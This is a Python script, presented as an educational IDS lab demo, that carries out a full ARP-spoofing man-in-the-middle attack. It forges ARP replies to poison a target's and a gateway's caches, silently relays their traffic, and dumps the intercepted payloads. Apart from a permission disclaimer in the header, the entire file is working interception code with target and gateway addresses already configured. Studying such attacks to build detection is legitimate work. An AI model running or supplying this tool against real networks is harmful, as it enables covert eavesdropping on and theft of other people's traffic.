#!/usr/bin/env python3
"""
ARP-spoof + transparent relay  (pure Python, standard library only)

EDUCATIONAL LAB USE ONLY
------------------------
This is a demo for the IDS module. Only run it on a network you own or on a
lab network where you have explicit written permission. Intercepting other
people's traffic without authorization is illegal.

What it teaches
---------------
1. Build Ethernet + ARP frames by hand with `struct` (no Scapy).
2. Poison two ARP caches so both hosts think the attacker is the other one:
       target  -> "10.188.112.30 (gateway) is at <attacker MAC>"
       gateway -> "10.188.112.41 (target)  is at <attacker MAC>"
3. Relay (forward) every captured frame to its real destination, so the
   connection never breaks and the target does not notice.
4. Print the L4 payload (what the client sends to the server) to stdout
   while relaying it.

Linux only: AF_PACKET raw sockets are required.
Run as root.
"""

import fcntl
import os
import signal
import socket
import struct
import sys
import threading
import time

# ---------------------------------------------------------------------------
# LAB CONFIGURATION  -- edit these to match your lab
# ---------------------------------------------------------------------------
# IFACE        = os.environ.get("IFACE", "wlan0")  # e.g. wlan0 / eth0 / enp3s0
IFACE        = "wlp2s0"  # e.g. wlan0 / eth0 / enp3s0
TARGET_IP    = "10.110.233.222"                   # the "client"
TARGET_MAC   = "aa:bb:25:b4:f7:a9"
GATEWAY_IP   = "10.110.233.187"                   # the "server" / router
GATEWAY_MAC  = None                              # None -> resolve with ARP
ATTACKER_MAC = None                              # None -> read from IFACE

POISON_INTERVAL = 1.0   # seconds between poisoning frames
# ---------------------------------------------------------------------------

ETH_P_ALL = 0x0003
ETH_P_IP  = 0x0800
ETH_P_ARP = 0x0806

ARP_REQUEST = 1
ARP_REPLY   = 2

BROADCAST = b"\xff" * 6


# ----------------------------- small helpers -------------------------------
def mac_bytes(mac: str) -> bytes:
    """'dc:0e:a1:35:99:b9' -> b'\\xdc\\x0e...'"""
    return bytes(int(part, 16) for part in mac.replace("-", ":").split(":"))


def mac_str(raw: bytes) -> str:
    return ":".join("%02x" % b for b in raw)


def ip_bytes(ip: str) -> bytes:
    return socket.inet_aton(ip)


def iface_mac(ifname: str) -> str:
    """Read the hardware address of an interface (SIOCGIFHWADDR)."""
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        info = fcntl.ioctl(
            s.fileno(), 0x8927, struct.pack("256s", ifname[:15].encode())
        )
    return mac_str(info[18:24])


def iface_ip(ifname: str) -> str:
    """Read the IPv4 address of an interface (SIOCGIFADDR)."""
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        info = fcntl.ioctl(
            s.fileno(), 0x8915, struct.pack("256s", ifname[:15].encode())
        )
    return socket.inet_ntoa(info[20:24])


# --------------------------- frame construction ----------------------------
def build_arp(op: int, sha: bytes, spa: bytes, tha: bytes, tpa: bytes) -> bytes:
    """
    Ethernet(14) + ARP(28) frame.

        Ethernet: dst(6) src(6) ethertype(2)=0x0806
        ARP     : htype(2)=1 ptype(2)=0x0800 hlen(1)=6 plen(1)=4
                  oper(2) sha(6) spa(4) tha(6) tpa(4)
    """
    ethernet = tha + sha + struct.pack("!H", ETH_P_ARP)
    arp = struct.pack("!HHBBH", 1, ETH_P_IP, 6, 4, op)
    arp += sha + spa + tha + tpa
    return ethernet + arp


def open_arp_socket(ifname: str) -> socket.socket:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                      socket.htons(ETH_P_ARP))
    s.bind((ifname, 0))
    return s


def resolve_mac(ifname: str, ip: str, timeout: float = 3.0) -> str:
    """Find the MAC that currently answers for `ip`, using a hand-built ARP."""
    me_mac = mac_bytes(iface_mac(ifname))
    me_ip = ip_bytes(iface_ip(ifname))
    request = build_arp(ARP_REQUEST, me_mac, me_ip, BROADCAST, ip_bytes(ip))

    sock = open_arp_socket(ifname)
    sock.settimeout(0.2)
    try:
        sock.send(request)
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                frame, _ = sock.recvfrom(2048)
            except socket.timeout:
                sock.send(request)
                continue
            if len(frame) < 42:
                continue
            oper = struct.unpack("!H", frame[20:22])[0]
            sender_ip = frame[28:32]
            if oper == ARP_REPLY and sender_ip == ip_bytes(ip):
                return mac_str(frame[22:28])
    finally:
        sock.close()
    raise RuntimeError(
        "Could not resolve MAC for %s -- is the host up? "
        "You can also set GATEWAY_MAC manually." % ip
    )


# ------------------------------- poisoning ---------------------------------
class Poisoner(threading.Thread):
    """Keep telling one victim that a foreign IP lives at our MAC."""

    def __init__(self, ifname, attacker_mac, spoof_ip, victim_mac,
                 victim_ip, stop):
        super().__init__(daemon=True)
        self.ifname = ifname
        self.attacker_mac = attacker_mac
        self.spoof_ip = spoof_ip
        self.victim_mac = victim_mac
        self.victim_ip = victim_ip
        self.stop = stop

    def run(self):
        frame = build_arp(ARP_REPLY, self.attacker_mac, ip_bytes(self.spoof_ip),
                          self.victim_mac, ip_bytes(self.victim_ip))
        sock = open_arp_socket(self.ifname)
        try:
            while not self.stop.is_set():
                try:
                    sock.send(frame)
                except OSError:
                    pass
                self.stop.wait(POISON_INTERVAL)  # sleep, but wake on Ctrl+C
        finally:
            sock.close()


def restore(target_mac, target_ip, gateway_mac, gateway_ip, ifname,
            rounds: int = 5):
    """Put the real MAC/IP bindings back so the network heals."""
    to_target = build_arp(ARP_REPLY, gateway_mac, ip_bytes(gateway_ip),
                          target_mac, ip_bytes(target_ip))
    to_gateway = build_arp(ARP_REPLY, target_mac, ip_bytes(target_ip),
                           gateway_mac, ip_bytes(gateway_ip))
    sock = open_arp_socket(ifname)
    try:
        for _ in range(rounds):
            sock.send(to_target)
            sock.send(to_gateway)
            time.sleep(0.2)
    finally:
        sock.close()


# --------------------------- payload inspection ----------------------------
def hexdump(data: bytes, limit: int = 256) -> str:
    out = []
    for offset in range(0, len(data), 16):
        chunk = data[offset:offset + 16]
        hx = " ".join("%02x" % b for b in chunk).ljust(47)
        asc = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        out.append("    %04x  %s  %s" % (offset, hx, asc))
    if len(data) > limit:
        out.append("    ... (%d bytes total)" % len(data))
    return "\n".join(out)


def show_ip(frame: bytes, direction: str) -> None:
    """Parse the IPv4 packet and print TCP/UDP/ICMP payload if it has any."""
    ip = frame[14:]
    if len(ip) < 20 or (ip[0] >> 4) != 4:
        return
    ihl = (ip[0] & 0x0F) * 4
    if ihl < 20 or len(ip) < ihl:
        return
    frag = struct.unpack("!H", ip[6:8])[0]
    if frag & 0x1FFF:          # not the first fragment -> no L4 header here
        return
    total = min(struct.unpack("!H", ip[2:4])[0], len(ip))
    proto = ip[9]
    src = socket.inet_ntoa(ip[12:16])
    dst = socket.inet_ntoa(ip[16:20])
    seg = ip[ihl:total]

    if proto == 6 and len(seg) >= 20:                 # TCP
        sport, dport = struct.unpack("!HH", seg[0:4])
        data_offset = (seg[12] >> 4) * 4
        data = seg[data_offset:] if data_offset >= 20 else b""
        label = "TCP  %s:%d -> %s:%d" % (src, sport, dst, dport)
    elif proto == 17 and len(seg) >= 8:               # UDP
        sport, dport = struct.unpack("!HH", seg[0:4])
        data = seg[8:]
        label = "UDP  %s:%d -> %s:%d" % (src, sport, dst, dport)
    elif proto == 1 and len(seg) >= 4:                # ICMP
        data = seg[4:]
        label = "ICMP %s -> %s" % (src, dst)
    else:
        return

    if not data:
        return  # skip pure ACKs / empty keep-alives, keep the output readable

    print("\n[%s] %-15s %s  (%d bytes)"
          % (time.strftime("%H:%M:%S"), direction, label, len(data)))
    print(hexdump(data))


# ------------------------------- relaying ----------------------------------
def run_relay(sock, attacker_mac, target_mac, gateway_mac, stop):
    """
    Read every frame, and if it is a poisoned frame addressed to us, print its
    payload and re-send it, unchanged except for the Ethernet addressing, to
    the real next hop.  The IP packet itself is never modified, so checksums
    stay valid and the two endpoints do not notice anything.
    """
    while not stop.is_set():
        try:
            frame, _ = sock.recvfrom(65535)
        except socket.timeout:
            continue
        except OSError:
            break

        if len(frame) < 14:
            continue
        dst = frame[0:6]
        src = frame[6:12]

        # Only touch frames that the poison made our machine the next hop for.
        if dst != attacker_mac:
            continue
        if struct.unpack("!H", frame[12:14])[0] != ETH_P_IP:
            continue

        if src == target_mac:
            direction = "client -> server"
            out = gateway_mac + attacker_mac + frame[12:]
        elif src == gateway_mac:
            direction = "server -> client"
            out = target_mac + attacker_mac + frame[12:]
        else:
            continue

        show_ip(frame, direction)
        try:
            sock.send(out)
        except OSError:
            pass


# --------------------------------- main ------------------------------------
def main():
    if os.geteuid() != 0:
        sys.exit("Raw sockets need root: run with sudo.")

    attacker_mac = mac_bytes(ATTACKER_MAC) if ATTACKER_MAC \
        else mac_bytes(iface_mac(IFACE))
    target_mac = mac_bytes(TARGET_MAC)

    if GATEWAY_MAC:
        gateway_mac = mac_bytes(GATEWAY_MAC)
    else:
        print("[*] resolving %s ..." % GATEWAY_IP)
        gateway_mac = mac_bytes(resolve_mac(IFACE, GATEWAY_IP))

    print("[*] interface    : %s" % IFACE)
    print("[*] attacker MAC : %s" % mac_str(attacker_mac))
    print("[*] target       : %s  (%s)" % (TARGET_IP, mac_str(target_mac)))
    print("[*] gateway      : %s  (%s)" % (GATEWAY_IP, mac_str(gateway_mac)))
    print("[*] poisoning ARP caches, relaying traffic. Ctrl+C to stop.\n")

    stop = threading.Event()

    relay_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                               socket.htons(ETH_P_ALL))
    relay_sock.bind((IFACE, 0))
    relay_sock.settimeout(1.0)

    # 1) tell the target that the gateway is at our MAC
    # 2) tell the gateway that the target is at our MAC
    poisoners = [
        Poisoner(IFACE, attacker_mac, GATEWAY_IP, target_mac, TARGET_IP, stop),
        Poisoner(IFACE, attacker_mac, TARGET_IP, gateway_mac, GATEWAY_IP, stop),
    ]
    for thread in poisoners:
        thread.start()

    def on_signal(signum, _frame):
        stop.set()

    signal.signal(signal.SIGINT, on_signal)
    signal.signal(signal.SIGTERM, on_signal)

    try:
        run_relay(relay_sock, attacker_mac, target_mac, gateway_mac, stop)
    finally:
        stop.set()
        for thread in poisoners:
            thread.join(timeout=2.0)
        print("\n[*] restoring ARP tables ...")
        restore(target_mac, TARGET_IP, gateway_mac, GATEWAY_IP, IFACE)
        relay_sock.close()
        print("[*] done.")


if __name__ == "__main__":
    main()
